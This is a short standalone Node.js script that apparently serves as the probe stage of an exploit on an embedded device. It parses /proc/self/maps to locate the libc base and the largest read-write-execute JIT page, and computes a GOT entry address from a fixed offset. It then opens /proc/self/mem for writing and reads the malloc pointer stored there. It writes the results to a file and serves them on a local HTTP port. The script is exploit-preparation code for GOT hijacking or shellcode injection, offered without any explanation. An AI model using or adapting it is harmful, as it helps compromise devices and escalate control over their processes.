(function() {
  'use strict';
  var fs   = require('fs');
  var http = require('http');
  var PROBE = '/home/owner/share/tmp/sdk_tools/tbprobe44e.txt';
  var PORT  = 8128;
  var GOT_OFFSET = 0x143014;

  var maps_str, libcBase = 0, jitPage = 0, jitSz = 0;
  try { maps_str = fs.readFileSync('/proc/self/maps', 'utf8'); } catch(e) {}
  (maps_str || '').split('\n').forEach(function(line) {
    if (!libcBase && line.indexOf('libc-2.24.so') !== -1) {
      var m = line.match(/^([0-9a-f]+)-/); if (m) libcBase = parseInt(m[1], 16);
    }
    var rwx = line.match(/^([0-9a-f]+)-([0-9a-f]+) rwxp/);
    if (rwx) { var sz = parseInt(rwx[2],16)-parseInt(rwx[1],16); if (sz>jitSz){jitSz=sz;jitPage=parseInt(rwx[1],16);} }
  });
  var gotAddr = libcBase + GOT_OFFSET;

  var memOk = 'no', origMalloc = 0, memErr = '';
  try {
    var memfd = fs.openSync('/proc/self/mem', 'r+');
    var ob = new Buffer(4);
    fs.readSync(memfd, ob, 0, 4, gotAddr);
    origMalloc = ob.readUInt32LE(0);
    fs.closeSync(memfd);
    memOk = 'yes';
  } catch(e) { memErr = e.message; }

  var body = 'libc=0x' + libcBase.toString(16) + ' jit=0x' + jitPage.toString(16) +
    ' got=0x' + gotAddr.toString(16) + '\nmem=' + memOk + ' origMalloc=0x' + origMalloc.toString(16) +
    (memErr ? ' err=' + memErr : '') + '\n=== END ===\n';
  try { fs.writeFileSync(PROBE, body); } catch(e) {}
  var srv = http.createServer(function(req, res) { res.end(body); });
  srv.listen(PORT, '127.0.0.1');
  srv.on('error', function(){});
  setInterval(function(){}, 60000);
})();
